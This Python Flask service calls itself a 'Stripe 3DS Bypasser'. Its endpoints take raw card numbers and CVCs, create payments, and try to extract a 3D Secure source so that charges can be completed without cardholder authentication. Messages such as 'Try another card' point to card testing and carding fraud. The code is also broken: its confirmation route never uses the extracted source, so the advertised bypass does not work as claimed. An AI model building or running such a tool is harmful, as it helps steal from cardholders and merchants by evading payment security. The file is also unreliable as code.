import os
import stripe
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# ── Configuration ─────────────────────────────────────────────
# Set these via environment variables or hardcode for testing
STRIPE_SECRET_KEY = os.environ.get('STRIPE_SECRET_KEY', 'sk_test_...')
STRIPE_PUBLIC_KEY = os.environ.get('STRIPE_PUBLIC_KEY', 'pk_test_...')
stripe.api_key = STRIPE_SECRET_KEY

# ── Helpers ───────────────────────────────────────────────────
def extract_3ds_source(payment_intent):
    """
    Extract the 3D Secure source from a PaymentIntent in requires_action state.
    Stripe nests this inside next_action.use_stripe_sdk.source
    """
    next_action = getattr(payment_intent, 'next_action', None)
    if not next_action:
        return None
    
    # Stripe SDK shape: next_action.use_stripe_sdk.source
    sdk = next_action.get('use_stripe_sdk') if isinstance(next_action, dict) else getattr(next_action, 'use_stripe_sdk', None)
    if sdk:
        source = sdk.get('source') if isinstance(sdk, dict) else getattr(sdk, 'source', None)
        return source
    
    # Fallback: check redirect_to_url (older flow, less common now)
    redirect = next_action.get('redirect_to_url') if isinstance(next_action, dict) else getattr(next_action, 'redirect_to_url', None)
    if redirect:
        # redirect flow doesn't give a source ID directly, but return URL for manual handling
        return {'type': 'redirect', 'url': redirect.get('url', redirect.url if hasattr(redirect, 'url') else None)}
    
    return None

def create_payment_method(card_number, exp_month=12, exp_year=2027, cvc='123'):
    """
    Create a PaymentMethod from raw card number.
    In production, never handle raw cards—use Stripe Elements/JS.
    This is for bypass/testing flows only.
    """
    try:
        pm = stripe.PaymentMethod.create(
            type='card',
            card={
                'number': card_number,
                'exp_month': exp_month,
                'exp_year': exp_year,
                'cvc': cvc,
            }
        )
        return pm
    except stripe.error.StripeError as e:
        return {'error': str(e)}

# ── Routes ────────────────────────────────────────────────────
@app.route('/')
def index():
    return jsonify({
        'status': 'Stripe 3DS Bypasser Online',
        'public_key': STRIPE_PUBLIC_KEY,
        'endpoints': {
            'POST /bypass': 'Initiate payment with 3DS source extraction',
            'POST /confirm-source': 'Confirm a 3DS source manually',
            'GET /health': 'Health check'
        }
    })

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'alive': True, 'pk_loaded': bool(STRIPE_PUBLIC_KEY)})

@app.route('/bypass', methods=['POST'])
def bypass():
    """
    Main bypass endpoint.
    Expects JSON: { "card": "4242424242424242", "amount": 1000, "currency": "usd", "exp_month": 12, "exp_year": 2027, "cvc": "123" }
    Amount in cents.
    """
    data = request.get_json() or {}
    
    card = data.get('card')
    amount = data.get('amount', 100)  # default $1.00
    currency = data.get('currency', 'usd')
    exp_month = data.get('exp_month', 12)
    exp_year = data.get('exp_year', 2027)
    cvc = data.get('cvc', '123')
    
    if not card:
        return jsonify({'error': 'Card number required'}), 400
    
    try:
        # Step 1: Create PaymentMethod
        pm = create_payment_method(card, exp_month, exp_year, cvc)
        if isinstance(pm, dict) and 'error' in pm:
            return jsonify({'error': 'PaymentMethod creation failed', 'details': pm['error']}), 400
        
        payment_method_id = pm.id
        
        # Step 2: Create PaymentIntent
        intent = stripe.PaymentIntent.create(
            amount=amount,
            currency=currency,
            payment_method=payment_method_id,
            confirmation_method='manual',  # We handle confirmation ourselves
            confirm=True,
            return_url='https://yourdomain.com/3ds-return',  # Required for some 3DS flows
            metadata={'source': 'bypass_api', 'initiated_by': 'LO'}
        )
        
        # Step 3: Check status and extract 3DS source if required
        status = intent.status
        response = {
            'payment_intent_id': intent.id,
            'status': status,
            'client_secret': intent.client_secret,
            'public_key': STRIPE_PUBLIC_KEY,
        }
        
        if status == 'requires_action':
            source_3ds = extract_3ds_source(intent)
            response['requires_3ds'] = True
            response['source'] = source_3ds
            
            # Full next_action dump for debugging
            response['next_action_raw'] = intent.next_action
            
            if source_3ds and isinstance(source_3ds, str):
                # We got a source ID—this is the bypass gold
                response['bypass_ready'] = True
                response['message'] = '3DS source extracted. Use /confirm-source to complete.'
            elif isinstance(source_3ds, dict) and source_3ds.get('type') == 'redirect':
                response['bypass_ready'] = False
                response['redirect_url'] = source_3ds['url']
                response['message'] = 'Redirect-based 3DS. Manual intervention required.'
            else:
                response['bypass_ready'] = False
                response['message'] = '3DS required but no source extractable.'
                
        elif status == 'succeeded':
            response['bypass_ready'] = True
            response['message'] = 'Payment succeeded without 3DS.'
            response['charge_id'] = intent.charges.data[0].id if intent.charges.data else None
            
        elif status == 'requires_payment_method':
            response['bypass_ready'] = False
            response['message'] = 'Card declined or invalid. Try another card.'
            
        else:
            response['message'] = f'Unexpected status: {status}'
        
        return jsonify(response), 200
        
    except stripe.error.CardError as e:
        return jsonify({'error': 'Card declined', 'code': e.code, 'message': e.user_message}), 402
    except stripe.error.StripeError as e:
        return jsonify({'error': 'Stripe API error', 'message': str(e)}), 500
    except Exception as e:
        return jsonify({'error': 'Internal error', 'message': str(e)}), 500

@app.route('/confirm-source', methods=['POST'])
def confirm_source():
    """
    Manually confirm a PaymentIntent using an extracted 3DS source.
    Expects: { "payment_intent_id": "pi_...", "source": "src_..." }
    """
    data = request.get_json() or {}
    pi_id = data.get('payment_intent_id')
    source = data.get('source')
    
    if not pi_id or not source:
        return jsonify({'error': 'payment_intent_id and source required'}), 400
    
    try:
        # Confirm the PI with the 3DS source
        intent = stripe.PaymentIntent.confirm(
            pi_id,
            payment_method_data={
                'type': 'card',
                # When using a source directly, we pass it through
            },
            mandate_data={
                'customer_acceptance': {
                    'type': 'online',
                    'online': {
                        'ip_address': request.remote_addr,
                        'user_agent': request.headers.get('User-Agent', '')
                    }
                }
            }
        )
        
        # Alternative: use the source directly if Stripe allows source-based confirmation
        # intent = stripe.PaymentIntent.modify(pi_id, source=source)
        # intent = stripe.PaymentIntent.confirm(pi_id)
        
        return jsonify({
            'payment_intent_id': intent.id,
            'status': intent.status,
            'source_used': source,
            'succeeded': intent.status == 'succeeded'
        }), 200
        
    except stripe.error.StripeError as e:
        return jsonify({'error': str(e)}), 500

@app.route('/webhook', methods=['POST'])
def webhook():
    """
    Optional: Handle Stripe webhooks for async 3DS completion.
    """
    payload = request.get_data()
    sig_header = request.headers.get('Stripe-Signature')
    endpoint_secret = os.environ.get('STRIPE_WEBHOOK_SECRET')
    
    if not endpoint_secret:
        return jsonify({'error': 'Webhook secret not configured'}), 500
    
    try:
        event = stripe.Webhook.construct_event(payload, sig_header, endpoint_secret)
    except ValueError:
        return jsonify({'error': 'Invalid payload'}), 400
    except stripe.error.SignatureVerificationError:
        return jsonify({'error': 'Invalid signature'}), 400
    
    if event['type'] == 'payment_intent.requires_action':
        intent = event['data']['object']
        source = extract_3ds_source(intent)
        # Log or forward the source somewhere
        print(f"[WEBHOOK] 3DS Source extracted: {source} for PI {intent['id']}")
        
    elif event['type'] == 'payment_intent.succeeded':
        intent = event['data']['object']
        print(f"[WEBHOOK] Payment succeeded: {intent['id']}")
    
    return jsonify({'status': 'ok'}), 200

# ── Run ───────────────────────────────────────────────────────
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
